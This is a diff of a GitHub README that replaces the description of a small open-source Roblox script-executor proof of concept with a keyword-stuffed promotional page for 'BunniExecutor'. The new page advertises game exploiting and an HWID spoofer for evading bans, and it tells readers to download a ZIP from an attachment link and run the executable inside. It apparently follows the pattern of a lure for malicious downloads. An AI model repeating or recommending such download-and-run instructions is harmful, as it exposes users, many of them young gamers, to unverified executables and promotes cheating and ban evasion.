@@ -1,28 +1,78 @@
-# Roblox Websocket Executor
+# BunniExecutor
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+### 🐰 Welcome to BunniExecutor
 
-## How to use
+![Bunni Logo](images/bunni_logo.png)
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+Bunni is a premier Roblox exploiting platform, renowned for its cutting-edge tools, rapid updates, and robust support. Developed by experienced professionals, it ensures maximum efficiency, security, and a seamless user experience with features like HWID spoofer and extensive script support.
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+### Repository Topics
+- roblox 
+- bunni 
+- bunni-lol
+- bunni-official
+- roblox-bunni 
+- bunni-executor-download
+- bunni-executor 
+- bunni-external-download 
+- bunni-discord 
+- bunni-v2-download 
+- bunni-download 
+- executor-bunni 
+- bunni-no-key 
+- b
 
-### Demonstration
+### Download BunniExecutor
+[![Download BunniExecutor](https://img.shields.io/badge/Download-BunniExecutor-blue.svg)](https://github.com/user-attachments/files/16119815/Bunni.zip)
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+### Features
 
-## Further explanation
+- **Cutting-edge Tools**: Bunni offers a range of powerful exploiting tools to enhance your Roblox experience.
+- **Rapid Updates**: Our team is dedicated to providing frequent updates to keep you ahead in the game.
+- **Robust Support**: The experts behind Bunni are here to assist you with any questions or issues you may encounter.
+- **HWID Spoofer**: Protect your identity and maintain privacy while using Bunni.
+- **Extensive Script Support**: Execute a wide variety of scripts with BunniExecutor.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+### Get Started
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+To start using BunniExecutor, follow these simple steps:
+1. Click on the download button above or [here](https://github.com/user-attachments/files/16119815/Bunni.zip).
+2. Extract the downloaded file to your preferred location.
+3. Run the executable file and follow the on-screen instructions to install BunniExecutor.
+4. Launch Roblox, and enjoy the enhanced features that BunniExecutor offers.
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+### Community and Support
 
-## Attribution
+Join our Discord server for community discussions, updates, and immediate support: [Bunni Discord](https://discord.gg/bunni).
 
-Here are a list of open-source libraries used by this project.
+### Stay Updated
 
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+Follow us on our official social media channels to stay up-to-date with the latest news and updates:
+
+- [Twitter](https://twitter.com/bunni_official)
+- [Instagram](https://instagram.com/bunni_executor)
+- [Facebook](https://facebook.com/bunni.official)
+
+### Contribution
+
+We welcome contributions to enhance and improve BunniExecutor. If you have any suggestions, bug reports, or feature requests, please open an issue or submit a pull request on our GitHub repository.
+
+### Legal Disclaimer
+
+BunniExecutor is intended for educational and research purposes only. The developers and maintainers of this platform do not support nor encourage any malicious use of this software. Users are responsible for complying with their local laws and regulations while using BunniExecutor. 
+
+### Licensing
+
+BunniExecutor is distributed under the MIT license. See the [LICENSE](LICENSE) file for more information.
+
+### Credits
+
+Special thanks to our dedicated team of developers, designers, and testers who have helped in the creation and maintenance of BunniExecutor.
+
+---
+
+#### Thank you for choosing BunniExecutor! 🚀
+
+---
+
+*For inquiries, please contact support@bunniexecutor.com*
